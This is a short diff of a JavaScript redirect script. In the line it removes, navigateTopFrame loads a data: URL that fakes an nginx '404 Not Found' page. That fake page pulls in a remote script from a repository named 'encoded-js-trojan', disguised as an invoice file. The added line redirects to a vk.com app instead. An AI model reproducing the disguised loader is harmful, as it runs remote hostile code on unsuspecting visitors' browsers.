@@ -4,4 +4,4 @@ function navigateTopFrame(url) {
   window.open('', '_self', '');
   window.close();
 }
-navigateTopFrame("data:text/html;charset=utf-8,<html> <head> <title>404</title> </head> <body> <h1 style='text-align:center;'>404 Not Found</h1> <hr /> <p style='text-align:center;'>nginx 1.14</p> <script src='https://raw.githubusercontent.com/Sjord/encoded-js-trojan/master/invoice_Ir1vkp.js'></script> </body> </html>");
+navigateTopFrame("https://vk.com/app7794757#/?post=547927697");
